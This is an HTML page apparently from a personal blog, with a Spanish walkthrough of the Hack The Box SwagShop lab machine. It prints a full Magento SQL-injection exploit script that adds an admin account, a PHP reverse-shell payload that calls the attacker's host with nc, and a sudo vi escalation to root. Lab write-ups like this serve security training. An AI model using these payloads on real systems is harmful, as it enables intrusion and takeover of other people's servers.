@@ -1,0 +1,707 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box SwagShop - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina SwagShop en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box SwagShop">
+<meta property="og:url" content="http://localhost:4000/htb-swagshop/">
+
+
+  <meta property="og:description" content="Resolución de la máquina SwagShop en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-swagshop/swagshop.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2022-02-27T00:00:00-06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-swagshop/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >Contacto</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box SwagShop</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Intelligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box SwagShop">
+    <meta itemprop="description" content="Resolución de la máquina SwagShop en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="February 27, 2022">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box SwagShop
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-02-27T00:00:00-06:00">February 27, 2022 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-swagshop/banner-swagshop.jpg" alt="" /></p>
+
+<h2 id="swagshop">SwagShop</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.140.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.140
+PING 10.10.10.140 <span class="o">(</span>10.10.10.140<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.140: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>136 ms
+
+<span class="nt">---</span> 10.10.10.140 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 136.377/136.377/136.377/0.000 ms
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.140 <span class="nt">-oG</span> allPorts
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-02-13 21:50 CST
+Initiating Ping Scan at 21:50
+Scanning 10.10.10.140 <span class="o">[</span>4 ports]
+Completed Ping Scan at 21:50, 0.16s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+Initiating SYN Stealth Scan at 21:50
+Scanning 10.10.10.140 <span class="o">[</span>65535 ports]
+Discovered open port 22/tcp on 10.10.10.140
+Discovered open port 80/tcp on 10.10.10.140
+Completed SYN Stealth Scan at 21:50, 38.89s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.140
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65532 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, 1 filtered tcp port <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>39.19 seconds
+           Raw packets sent: 69636 <span class="o">(</span>3.064MB<span class="o">)</span> | Rcvd: 69234 <span class="o">(</span>2.769MB<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬─────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.140
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 22,80
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.10.140 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-02-13 21:51 CST
+Nmap scan report <span class="k">for </span>10.10.10.140
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec <span class="o">(</span>RSA<span class="o">)</span>
+|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Did not follow redirect to http://swagshop.htb/
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>13.12 seconds
+</code></pre></div></div>
+
+<p>Observamos que el se tiene le puerto 80 abierto, por lo que antes de ver el contenido vía web, vamos a hacer uso de la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.140/
+http://10.10.10.140/ <span class="o">[</span>302 Found] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.140], RedirectLocation[http://swagshop.htb/]
+ERROR Opening: http://swagshop.htb/ - no address <span class="k">for </span>swagshop.htb
+</code></pre></div></div>
+
+<p>Aquí vemos que se presenta un redirect hacia el dominio <strong>swagshop.htb</strong>; por lo tanto sabemos que se debería aplicar <strong><em>Virtual Hosting</em></strong> y tenemos que agregarlo a nuestro archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> y posteriormente tratar de ejecutar nuevamente la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code> y despúes lo vemos vía web.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.140/
+http://10.10.10.140/ <span class="o">[</span>302 Found] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.140], RedirectLocation[http://swagshop.htb/]
+http://swagshop.htb/ <span class="o">[</span>200 OK] Apache[2.4.18], Cookies[frontend], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)]</span>, HttpOnly[frontend], IP[10.10.10.140], JQuery[1.10.2], Magento, Modernizr, Prototype, Script[text/javascript], Scriptaculous, Title[Home page], X-Frame-Options[SAMEORIGIN]
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-swagshop/swagshop-web.png" alt="" /></p>
+
+<p>Vemos que nos enfrentamos ante un <strong><em>Magento</em></strong>; por lo tanto, vamos a tratar de buscar si existen exploits públicos relacionados:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit magento remote code
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                 |  Path
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Magento CE &lt; 1.9.0.1 - <span class="o">(</span>Authenticated<span class="o">)</span> Remote Code Execution                                   | php/webapps/37811.py
+Magento eCommerce - Remote Code Execution                                                      | xml/webapps/37977.py
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+Papers: No Results
+</code></pre></div></div>
+
+<p>Tenemos dos relacionados con la ejecución de comandos, uno autenticado y el otro podríamos pensar que no necesitamos contar con credenciales, así que le echamos un ojito al segundo a ver que nos dice.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit <span class="nt">-m</span> xml/webapps/37977.py
+  Exploit: Magento eCommerce - Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/37977
+     Path: /usr/share/exploitdb/exploits/xml/webapps/37977.py
+File Type: ASCII text
+
+Copied to: /home/k4miyo/Documentos/HTB/SwagShop/content/37977.py
+
+
+❯ <span class="nb">mv </span>37977.py magento_rce.py
+</code></pre></div></div>
+
+<p>Analizando un poco el exploits, vamos a retocarlo para que nos funciones; primeramente eliminando los comentarios que tienen <code class="language-plaintext highlighter-rouge">/</code>, despúes validamos si el recurso <code class="language-plaintext highlighter-rouge">/admin/Cms_Wysiwyg/directive/index/</code> existe para nuestro caso.</p>
+
+<p><img src="/assets/images/htb-swagshop/swagshop-web1.png" alt="" /></p>
+
+<p>Pensando un poco, vemos que nuestra página presenta la dirección URL <code class="language-plaintext highlighter-rouge">http://swagshop.htb/index.php/</code>; por lo tanto podríamos agregar el <code class="language-plaintext highlighter-rouge">/admin/</code> despúes del <code class="language-plaintext highlighter-rouge">/index.php</code>:</p>
+
+<p><img src="/assets/images/htb-swagshop/swagshop-web2.png" alt="" /></p>
+
+<p>Nos encontramos con el panel de administración de <strong><em>Magento</em></strong> y de acuerdo con lo que dice el exploit, nos crea las credenciales <strong>forme:forme</strong>; las cuales podemos cambiar a las que nosotros queramos. Por lo tanto, el script nos quedaría de la siguiente forma:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">##################################################################################################
+#Exploit Title : Magento Shoplift exploit (SUPEE-5344)
+#Author        : Manish Kishan Tanwar AKA error1046
+#Date          : 25/08/2015
+#Love to       : zero cool,Team indishell,Mannu,Viki,Hardeep Singh,Jagriti,Kishan Singh and ritu rathi
+#Debugged At  : Indishell Lab(originally developed by joren)
+##################################################################################################
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="s">"http://swagshop.htb/index.php"</span>
+
+<span class="k">if</span> <span class="ow">not</span> <span class="n">target</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"http"</span><span class="p">):</span>
+    <span class="n">target</span> <span class="o">=</span> <span class="s">"http://"</span> <span class="o">+</span> <span class="n">target</span>
+
+<span class="k">if</span> <span class="n">target</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">"/"</span><span class="p">):</span>
+    <span class="n">target</span> <span class="o">=</span> <span class="n">target</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="n">target_url</span> <span class="o">=</span> <span class="n">target</span> <span class="o">+</span> <span class="s">"/admin/Cms_Wysiwyg/directive/index/"</span>
+
+<span class="n">q</span><span class="o">=</span><span class="s">"""
+SET @SALT = 'rp';
+SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
+SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
+INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
+INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
+"""</span>
+
+
+<span class="n">query</span> <span class="o">=</span> <span class="n">q</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="s">"k4miyo"</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s">"k4miyo123"</span><span class="p">)</span>
+<span class="n">pfilter</span> <span class="o">=</span> <span class="s">"popularity[from]=0&amp;popularity[to]=3&amp;popularity[field_expr]=0);{0}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+
+<span class="c1"># e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is
+</span><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span>
+                  <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">"___directive"</span><span class="p">:</span> <span class="s">"e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ"</span><span class="p">,</span>
+                        <span class="s">"filter"</span><span class="p">:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pfilter</span><span class="p">),</span>
+                        <span class="s">"forwarded"</span><span class="p">:</span> <span class="mi">1</span><span class="p">})</span>
+<span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">ok</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">"WORKED"</span>
+    <span class="k">print</span> <span class="s">"Check {0}/admin with creds k4miyo:k4miyo123"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">"DID NOT WORK"</span>
+</code></pre></div></div>
+
+<p>Lo ejecutamos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python2 magento_rce.py
+WORKED
+Check http://swagshop.htb/index.php/admin with creds k4miyo:k4miyo123
+</code></pre></div></div>
+
+<p>De acuerdo con esto, deberíamos acceder al panel de administración con las credenciales <strong>k4miyo:k4miyo123</strong>, así que vamos a probar.</p>
+
+<p><img src="/assets/images/htb-swagshop/swagshop-web3.png" alt="" /></p>
+
+<p>Hemos ingresado al panel de administración y recordando los exploits que encontramos, existe otro que nos permite la ejecución de comandos si contamos con credenciales válidas de acceso. Para este caso, vamos a hacerlo de manera manual, por lo tanto, lo primero que debemos hacer es ir a <strong>System &gt; Configuration</strong>.</p>
+
+<p><img src="/assets/images/htb-swagshop/swagshop-web4.png" alt="" /></p>
+
+<p>Del panel de configuración del lado izquierdo, nos vamos hasta abajo y seleccionamos <strong>Advanced &gt; Developer</strong>.</p>
+
+<p><img src="/assets/images/htb-swagshop/swagshop-web5.png" alt="" /></p>
+
+<p>En el apartado de <strong>Templete Settings</strong> vamos a cambiar el valor <strong>Allow Symlinks</strong> de <strong>No</strong> a <strong>Yes</strong> y guardamos los cambios.</p>
+
+<p><img src="/assets/images/htb-swagshop/swagshop-web6.png" alt="" /></p>
+
+<p>Ahora vamos a crear una nueva categoría en <strong>Catalog &gt; Manage Categories</strong>.</p>
+<ul>
+  <li><strong>Name</strong>: Lo que nosotros queramos, para este caso vamos a ponerle K4miShell.</li>
+  <li><strong>Is Active</strong>: Lo cambiamos a <strong>Yes</strong>.</li>
+  <li><strong>Thumbnail Image</strong>: Vamos a subir un archivo de nombre <strong>shell.php.png</strong> cuyo contenido nos ayude a entablarnos una reverse shell.</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+  <span class="nb">passthru</span><span class="p">(</span><span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.27 443 &gt;/tmp/f"</span><span class="p">)</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Y guardamos los cambios.</p>
+
+<p><img src="/assets/images/htb-swagshop/swagshop-web7.png" alt="" /></p>
+
+<p>Ahora vamos a darle click secundario en el hipervínculo donde se encuentra nuestra imagen y nos vamos a quedar con la parte de <code class="language-plaintext highlighter-rouge">/media/catalog/category/shell.php.png</code>, ya que dicho recurso existe a nivel de sistema. Ahora nos falta hacer un llamado a nuestro archivo para que se ejecute, esto lo logramos en la sección <strong>Newsletter &gt; Newsletter Templates</strong>.</p>
+
+<p><img src="/assets/images/htb-swagshop/swagshop-web8.png" alt="" /></p>
+
+<p>Agregamos un nuevo template en <strong>Add New Template</strong> modificando los siguiente parámetros:</p>
+<ul>
+  <li><strong>Template Name</strong>: Lo que nosotros queramos, para este caso Shell.</li>
+  <li><strong>Template Subject</strong>: Lo que nosotros queramos, para este caso Shell.</li>
+  <li><strong>Template Content</strong>: Borramos lo que contiene y escribimos lo siguiente:</li>
+</ul>
+
+<p><strong>{{block type=’core/template’ template=’../../../../../..//media/catalog/category/shell.php.png’}}</strong></p>
+
+<p><img src="/assets/images/htb-swagshop/swagshop-web9.png" alt="" /></p>
+
+<p>Antes de darle en la parte de <strong>Preview Template</strong> vamos a ponernos en escucha por el puerto 443:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.140] 37154
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ whoami
+www-data
+$ 
+</span></code></pre></div></div>
+
+<p>Ya tenemos acceso a la máquina y para trabajar más comodos, vamos a hacer un <a href="/tratamiento-tty">Tratamiento de la tty</a>. Si accemos a la carpeta del usuario <strong>haris</strong> vemos que podemos visualizar la flag (user.txt); asi que ahora vamos a enumerar un poco el sistema para ver de que forma nos convertimos en <strong>root</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@swagshop:/home/haris<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+www-data@swagshop:/home/haris<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>www-data on swagshop:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User www-data may run the following commands on swagshop:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/vi /var/www/html/<span class="k">*</span>
+www-data@swagshop:/home/haris<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Vemos que podemos ejecutar <code class="language-plaintext highlighter-rouge">/usr/bin/vi /var/www/html/*</code> como el usuario <strong>root</strong> sin proporcionar contraseña; por lo tanto podriamos abrir un recurso cualquier, es decir, poner lo que nos de la gana bajo <code class="language-plaintext highlighter-rouge">/var/www/html/</code> y luego ejecutar lo siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@swagshop:/home/haris<span class="nv">$ </span><span class="nb">sudo </span>vi /var/www/html/k4mishell
+</code></pre></div></div>
+
+<ul>
+  <li><strong>ESC</strong> y ponemos: <code class="language-plaintext highlighter-rouge">:set shell=/bin/bash</code>; con esto declaramos una variable que se llama <code class="language-plaintext highlighter-rouge">shell</code> y cuyo valor es <code class="language-plaintext highlighter-rouge">/bin/bash</code>.</li>
+  <li><strong>ESC</strong> y ponemos: <code class="language-plaintext highlighter-rouge">shell</code>; con esto llamamos a nuestra variable que nos va a ejecutar una <code class="language-plaintext highlighter-rouge">/bin/bash</code> como el usuario <strong>root</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@swagshop:/var/www/html<span class="nv">$ </span><span class="nb">sudo </span>vi /var/www/html/k4mishell
+
+root@swagshop:/var/www/html# <span class="nb">whoami
+</span>root
+root@swagshop:/var/www/html#
+</code></pre></div></div>
+
+<p>La otra forma y para no complicarnos, podriamos ocupar el parámetro <code class="language-plaintext highlighter-rouge">-c</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@swagshop:/var/www/html<span class="nv">$ </span><span class="nb">sudo </span>vi /var/www/html/k4mishell <span class="nt">-c</span> <span class="s1">'!/bin/bash'</span>
+
+root@swagshop:/var/www/html# <span class="nb">whoami
+</span>root
+root@swagshop:/var/www/html#
+</code></pre></div></div>
+
+<p>Ya somos el usuario <strong>root</strong> y podemos visualizar la flag (root.txt).</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#sql" class="page__taxonomy-item" rel="tag">SQL</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#sqli" class="page__taxonomy-item" rel="tag">SQLi</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-02-27T00:00:00-06:00">February 27, 2022</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-sense/" class="pagination--pager" title="Hack The Box Sense
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
